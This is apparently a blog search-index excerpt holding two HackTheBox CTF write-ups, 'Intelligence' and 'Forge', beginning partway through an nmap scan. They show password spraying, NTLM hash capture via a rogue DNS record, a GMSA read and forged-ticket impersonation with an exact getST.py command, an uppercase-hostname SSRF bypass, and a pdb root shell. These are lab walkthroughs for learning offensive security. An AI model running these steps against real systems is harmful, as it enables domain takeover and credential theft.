HTTP 1.0636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-10T23:29:21+00:00; +7h00m03s from scanner time.| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:163268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-10T23:29:21+00:00; +7h00m02s from scanner time.| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:163269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)|_ssl-date: 2022-04-10T23:29:21+00:00; +7h00m03s from scanner time.| ssl-cert: Subject: commonName=dc.intelligence.htb| Subject Alternative Name: othername:&amp;lt;unsupported&amp;gt;, DNS:dc.intelligence.htb| Not valid before: 2021-04-19T00:43:16|_Not valid after: 2022-04-19T00:43:165985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found9389/tcp open mc-nmf .NET Message FramingWe have our hostname of intelligence.htb, we can add that to /etc/hosts and continue on to Port 80.Port 80http://intelligence.htb/This page is very simple, there isn’t a whole lot going on. Scrolling down on the landing page, there aretwo PDF files available for download.http://intelligence.htb/These documents listed for download are simply just full of Lorem Ipsum.The naming convention of these files however are far more interesting: YYYY-MM-DD-upload.pdfWe can scan for that, but before we do, we should make sure these documents are definitely useless by extracting theirmetadata using a tool called exiftool.exiftool 2020-01-01-upload.pdfGood thing we checked, we are given a username in the Creator field that we can assume to be Active Directory usernames.We have our first one, William.Lee. Now we have a clear goal in mind. Generate a list of possible filenames using the naming convention discovered above, Fuzz the server for them, Download the ones that exist, Extract their creators, Scan all the documents for keywords because there’s no way they’re all just Lorem Ipsum.First off, generating the list of possible filenames.dateGen.pyI am far from proud of this script and there is certainly a far better way but hey, it works and I’m already finished with it.We’re left with a file full of all the possible names for files on the server. (I also checked 2019 and 2021; nothing there.)PDF Fuzzing ListWriting this up, I’ve just realized my script missed 2020-01-10 and presumably others. Serves me right for writing that abomination. Good thing I didn’t need them. Anyway, with this list, we can find what files are hiding on the server.Fuzzing Documentswfuzz did not want to give me a list I could use, so I can just copy the output and use awkto liberate the filenames into a format I can actually use.Bash MagicNow that we have a list of real PDFs, we can use another Bash one-liner to fetch all of them.Now that we’ve retrieved all of our PDFs we can harvest the names of all their creators to use for later spraying.79 Creators HarvestedSome of these creators may appear across multiple documents and consequentially, appear multiple times in this list.For our purposes in this CTF, there’s no need to filter them out. Now that we have our usernames, we just have toscan these documents for keywords to make sure we haven’t missed anything. The documents are currently in PDF format.We need to first get them into a more friendly format to scan them, thankfully, pdftotext exists. pdftotext doesn’tseem to like multiple inputs so we can simply just Bash loop them in.79 Text FilesSmooth sailing from here. Simply cat *, pass it to grep with some keywords and see what falls on our lap.NewIntelligenceCorpUser9876There we have it. Some diamonds in the rough. We have a default domain password, an extensive list of usernames andan internal IT update we’ll see more of in the root portion of this box. Now we can get to the password-spraying.For this I like to use Metasploit, more specifically: auxiliary/scanner/smb/smb_login. With this module, I passin RHOSTS, SMBDomain, USER_FILE, PASS_FILE and run the scanner.Tiffany.Molina:NewIntelligenceCorpUser9876In a sea of invalid credentials, Tiffany.Molina is still using the default password and is our ticket into thedomain.SMBClientAuthenticating into the SMB as Tiffany.Molina, we get a list of shares she has access to.Tiffany - SMBClientNavigating to the Users share, we see Ted.Graves who is presumably our root target and Tiffany.Molina who we will retrieve our user flag from. Navigate to her desktop and there it is.User.txtSystemThis part is where things started to get a little bit confusing for me on account of being relatively new to Windowsmachines on HackTheBox. Despite not having the knowledge necessary to see this machine through to the end on my own,in the interest of learning how it’s done, I am using oxdf’s writeupof this machine as a reference to practice Active Directory exploitation.Remembering back earlier, we found the Internal IT Update in the documents regarding Ted’s script. As Tiffany,we have access to the IT SMB share so we can see what it’s all about. Connecting to the IT share, we find the scriptreferenced earlier: downdetector.ps1Downloading DownDetector.ps1, it’s relatively easy to decipher what it’s doing.DownDetector.ps1This script: Fetches every domain object beginning with web*, Makes a web request to each domain object beginning with web* (Using Ted’s credentials), If the server doesn’t respond, the script sends Ted an email informing him of the outage.Fortunately, dnstool.py exists. With this tool,we can create a DNS record, name the record something to match the criteria like webSlimicide, resolve it to myTUN0 IP and capture Ted’s NTLMv2 hash with Responder.dnstool.py // responderdnstool.py parameters----------------------u = username-p = password-a = action-r = record name-d = record data-t = record typeThe security on this box is incredible.By the time the script runs, the intruder will be long dead of old age.Eventually, we catch Ted’s NTLMv2 hash.Ted.Graves NTLMv2 HashYou can’t see it in that screenshot, but trust me, it’s there. Upon capturing this hash, we can head over to HashCatand see if we can crack it. Using RockYou.txt, the hash cracks almost instantly and we are left with a new set ofcredentials: Ted.Graves:Mr.Teddy.We have now compromised two accounts in this domain. Time to go see what new permissions are afforded to us courtesyof Ted Graves. Easiest way to do this is to call in the Bloodhound.BloodhoundUsing Bloodhound-Python, we can authenticate into the domain and Bloodhound will collect all the information it canand bundle it into a nice little JSON file to be imported into Bloodhound’s GUI. For good measure, we’ll runBloodhound-Python on both Ted.Graves and Tiffany.Molina.After importing the information provided to us by Bloodhound-Python and analysing the permissions of our compromisedusers, we discover that Ted.Graves is a member of the IT Support group in the domain and as a member of that group,he consequentially has permissions to read the GMSA password of SVC_INT.ReadGMSAPasswordGMSA Accounts are automated service accounts necessary for the fulfilment of tasks in their respective domains, theseaccounts must also authenticate themselves when performing their tasks and so being able to read the GMSA’s passwordis great for us. We get a silver-ticket, not so great for the domain.After searching for a tool which may be able to read this password for us, we come across a GitHub repository forgMSADumper. Running this tool, we’re given the password hash for svc_int:svc_intWith the password hash of a service account, we can now use GetST.py from Impacket to generate a silver-ticket toimpersonate Administrator. Doing this requires us to sync our system’s time to the server. In some cases like mine,if you are running a VirtualBox VM, you will first have to do:sudo service virtualbox-guest-utils stopTo prevent VirtualBox from automatically resetting your time. After stopping that service, you then run:sudo ntpdate 10.10.10.248To sync up with the server.With all that out of the way, we can generate our silver-ticket.sudo python3 getST.py -dc-ip 10.10.10.248 -spn www/dc.intelligence.htb -hashes :a5fd76c71109b0b483abe309fbc92ccb -impersonate Administrator intelligence.htb/svc_int-------------------------------------------------------------------[-] CCache file is not found. Skipping...[*] Getting TGT for user[*] Impersonating Administrator[*] Requesting S4U2self[*] Requesting S4U2Proxy[*] Saving ticket in Administrator.ccachegetST.py has saved our ticket to Administrator.ccache, we create the KRB5CCNAME environment variable,(which is typically used to authenticate service accounts) and point it towards our silver-ticket. We can then run Impacket’swmiexec.py using Kerberos authentication with our new shiny silver-ticket and we successfully have logged into thedomain as AdministratorAdministratorNavigate to C:\\Users\\Administrator\\Desktop and claim the root flag.root.txt:)" }, { "title": "HackTheBox - Forge", "url": "/posts/HackTheBox-Forge/", "categories": "HackTheBox, Machines", "tags": "hackthebox, forge, ssrf, upload, pdb", "date": "2022-05-03 14:30:00 +0000", "snippet": "HackTheBox ForgeForge is a retired medium machine on HackTheBox, it is the machine that made me want to create writeupsoriginally. After subscribing to HackTheBox and gaining access to retired machines, it’s finally time to do it.EnumerationScan:nmap -sC -sV -oA nmap_initial 10.10.11.111Results:Nmap scan report for 10.10.11.111Host is up (0.035s latency).PORT STATE SERVICE VERSION21/tcp filtered ftp22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 4f:78:65:66:29:e4:87:6b:3c:cc:b4:3a:d2:57:20:ac (RSA)| 256 79:df:3a:f1:fe:87:4a:57:b0:fd:4e:d0:54:c6:28:d9 (ECDSA)|_ 256 b0:58:11:40:6d:8c:bd:c5:72:aa:83:08:c5:51:fb:33 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Did not follow redirect to http://forge.htb|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Sat Apr 9 17:33:23 2022 -- 1 IP address (1 host up) scanned in 9.78 secondsWe get this machine’s hostname of forge.htb.Add it to /etc/hosts and move on. There is an FTP service active but not currently accessible to us meaningwe will begin with Port 80Port 80http://forge.htb/It seems to be a very simple image upload page where we can upload our own image using the button in the upper right.Clicking Upload an Image brings us to http://forge.htb/upload, it will allow us to upload through either localfile upload or upload from URL.http://forge.htb/uploadWe’ll see what happens when we upload an image of our own. Upon uploading the image, we’re given a link to where itwas uploaded on the server.Successful UploadIf we follow that link, it does in fact bring us to our perfect test image: low_intelligence.png. It has arrivedsafetly onto the server and it is on display in all its glory.low_intelligence.pngWho would have guessed? The image upload site allows image uploads. What happens when we upload something thatisn’t an image? We’ll upload a simple text file to find out.The server loads images via &amp;lt;img src=&quot;link&quot;&amp;gt; and I presume that is why it will not display. Although the contentisn’t displayed on the page, it is visible in the server response.This is a test file.The server allows us to read the contents of files despite them not being images. Interesting. We’ll come back to thislater.GobusterWe’ll start by enumerating vhosts.Scan:gobuster vhost -u forge.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -o gobuster-vhost-forge.htbThe server just spits out every request as a status 302, in order to identify the real vhosts, we can simply grep inverse search 302 from our gobuster output.cat gobuster-vhost-forge-htb | grep -v 302With this, we find only one valid vhost: admin.forge.htb and it is suspiciously small, only being [Size: 27].Add it to /etc/hosts and we’ll find out why.We arrive on admin.forge.htb and we are given an explanation for the size of the page. It simply says: Only localhost is allowed!. Not only does it explain the size of the page, it makes our target very clear.We need to exploit a SSRF vulnerability from the server’s Upload from URL input in order to read http://admin.forge.htb/SSRFServer-Side Request Forgery aka SSRF is a vulnerability in which we can exploit a server to make requests on our behalf.In this instance, admin.forge.htb is only accepting requests from localhost, we cannot access it from outside.However with SSRF, we can tell the parts of the server we can access to make that request for us as localhost.Luckily, I’m in the mood to create a MS-Paint masterpiece.SSRF - ForgeI hope you like it, took me a few minutes.Trying to access http://admin.forge.htb/ normally through /upload, we learn there is a blacklist in place to tryand mitigate SSRF by blocking requests to localhost, 127.0.0.1 and other popular loopback addresses such as 0.0.0.0.URL contains a blacklisted address!After trying out different SSRF payloads and bypasses, I have discovered two that work, one of them is much less annoyingthan the other.The more annoying bypass is URL encoding http://admin.forge.htb/ and submitting that.The easy bypass is simply submitting http://ADMIN.FORGE.HTB/ because the blacklist seems to only block its lowercaseequivalent. With this, we can submit the index page of admin.forge.htb to Upload from URL and read it from the serverresponse.http://ADMIN.FORGE.HTB/Through the page source, we learn of the existence of:1) http://admin.forge.htb/upload2) http://admin.forge.htb/announcementsBoth of which we can read using this SSRF. We’ll start with reading the admin’s announcements.http://ADMIN.FORGE.HTB/announcements/Here is our explanation for the inaccessible FTP server. We can access the FTP server through the admin’s /uploadendpoint using the provided credentials as a GET parameter. We’ll go and see what files are available through our externally accessible /upload endpoint using our payload:http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@LOCALHOSTSuccessThe FTP seems to be inside the user’s home directory judging by the presence of user.txt. We now know what to addon to our request to gain SSH access as user:http://ADMIN.FORGE.HTB/upload?u=ftp://user:heightofsecurity123!@LOCALHOST/.ssh/id_rsaid_rsaBy copying the SSH key to my local machine and setting the correct permissions, we now have SSH access as user.user.txtRootWe don’t have to do a lot of searching to find our privilege escalation vector. By running sudo -l, we are told wehave permission to execute a Python script as root.sudo -lRunning the script, it opens up a TCP listener, in order to interact with it, we can just open a second SSH sessionand we can then connect to the port specified by the script using nc already on the box. Upon connecting to the box,we are prompted to enter a “secret password”.Enter the secret passwordIt’s just a Python script, we can read it to find the password it’s looking for.secretadminpasswordMakes sense.After entering the password, we’re prompted with a menu.Admin MenuReading the script, we know that options 1-4 are boring. However, throwing an exception might be interestingbecause it gets the Python debugger involved. As the client, we select the non-existant option a and sure enough,the process dies and we’re given a pdb shell.pdbTyping help, we’re given a list of commands we can run.helpWe can use the interact command and it puts us into a Python interpreter. From here, we can simply:import osos.system(&#39;/bin/bash&#39;)We now have a bash shell as root which we can use to read the root flag.root.txtI have finished a handful of HackTheBox machines but Forge remains as a clear favorite. It is relativelystraight-forward as far as medium boxes go and it is immensely satisfying.:)" } ]
